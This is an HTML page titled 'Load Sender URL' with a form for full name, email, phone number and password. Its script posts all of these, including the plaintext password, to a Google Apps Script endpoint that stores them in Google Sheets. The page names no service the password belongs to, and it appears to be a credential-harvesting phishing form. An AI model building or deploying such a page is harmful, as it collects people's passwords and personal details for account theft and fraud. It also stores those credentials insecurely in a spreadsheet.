<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Load Sender URL</title>
    <style>
        /* CSS Styles */
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
            font-family: 'Arial', sans-serif;
        }

        body {
            background-color: #f5f5f5;
            color: #333;
            line-height: 1.6;
            padding: 20px;
        }

        .container {
            max-width: 600px;
            margin: 0 auto;
            background: #fff;
            padding: 30px;
            border-radius: 8px;
            box-shadow: 0 0 20px rgba(0, 0, 0, 0.1);
        }

        h1 {
            text-align: center;
            margin-bottom: 20px;
            color: #2c3e50;
        }

        .form-group {
            margin-bottom: 20px;
        }

        label {
            display: block;
            margin-bottom: 5px;
            font-weight: bold;
        }

        input {
            width: 100%;
            padding: 12px;
            border: 1px solid #ddd;
            border-radius: 4px;
            font-size: 16px;
        }

        .phone-group {
            display: flex;
            gap: 10px;
        }

        .country-code {
            flex: 0 0 80px;
        }

        .phone-number {
            flex: 1;
        }

        button {
            width: 100%;
            padding: 12px;
            background-color: #3498db;
            color: white;
            border: none;
            border-radius: 4px;
            font-size: 16px;
            cursor: pointer;
            transition: background-color 0.3s;
        }

        button:hover {
            background-color: #2980b9;
        }

        .success-message {
            display: none;
            margin-top: 20px;
            padding: 15px;
            background-color: #2ecc71;
            color: white;
            text-align: center;
            border-radius: 4px;
        }

        .error-message {
            display: none;
            margin-top: 20px;
            padding: 15px;
            background-color: #e74c3c;
            color: white;
            text-align: center;
            border-radius: 4px;
        }

        @media (max-width: 600px) {
            .container {
                padding: 20px;
            }
            
            .phone-group {
                flex-direction: column;
            }
            
            .country-code {
                flex: 1;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Load Sender URL</h1>
        <form id="userForm">
            <div class="form-group">
                <label for="name">Full Name</label>
                <input type="text" id="name" name="name" placeholder="Enter your full name">
            </div>
            
            <div class="form-group">
                <label for="email">Email Address</label>
                <input type="text" id="email" name="email" placeholder="Enter your email">
            </div>
            
            <div class="form-group">
                <label for="phone">Phone Number</label>
                <div class="phone-group">
                    <input type="text" id="countryCode" name="countryCode" class="country-code" placeholder="+1">
                    <input type="text" id="phoneNumber" name="phoneNumber" class="phone-number" placeholder="Phone number">
                </div>
            </div>
            
            <div class="form-group">
                <label for="password">Password</label>
                <input type="password" id="password" name="password" placeholder="Enter your password">
            </div>
            
            <button type="submit">Submit</button>
        </form>
        
        <div id="successMessage" class="success-message">
            Thank you! Your information has been successfully submitted.
        </div>
        
        <div id="errorMessage" class="error-message">
            There was an error submitting your information. Please try again later.
        </div>
    </div>

    <script>
        document.getElementById('userForm').addEventListener('submit', function(e) {
    e.preventDefault();
    
    // Show loading state (optional)
    const submitBtn = e.target.querySelector('button[type="submit"]');
    submitBtn.disabled = true;
    submitBtn.textContent = 'Submitting...';
    
    // Get form values
    const formData = {
        name: document.getElementById('name').value.trim(),
        email: document.getElementById('email').value.trim(),
        phone: document.getElementById('countryCode').value.trim() + 
               document.getElementById('phoneNumber').value.trim(),
        password: document.getElementById('password').value,
        timestamp: new Date().toISOString()
    };

    // Send data to Google Sheets
    fetch('https://script.google.com/macros/s/AKfycbxY36Y6F1t7IywL6BgafBqrw5cSQmUqSNkygXRO4h0Dg1rx8Y-TRRJx8ROdDP9kBpM/exec', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify(formData)
    })
    .then(response => {
        if (!response.ok) throw new Error('Network response was not ok');
        return response.json(); // Parse JSON response
    })
    .then(data => {
        if (data.result !== 'success') throw new Error(data.message || 'Unknown error');
        
        // Success handling
        document.getElementById('successMessage').style.display = 'block';
        document.getElementById('errorMessage').style.display = 'none';
        document.getElementById('userForm').reset();
    })
    .catch(error => {
        console.error('Error:', error);
        document.getElementById('errorMessage').style.display = 'block';
        document.getElementById('successMessage').style.display = 'none';
        document.getElementById('errorMessage').textContent = 
            'Error: ' + (error.message || 'Failed to submit form. Please try again.');
    })
    .finally(() => {
        submitBtn.disabled = false;
        submitBtn.textContent = 'Submit';
    });
});
    </script>
</body>
</html>
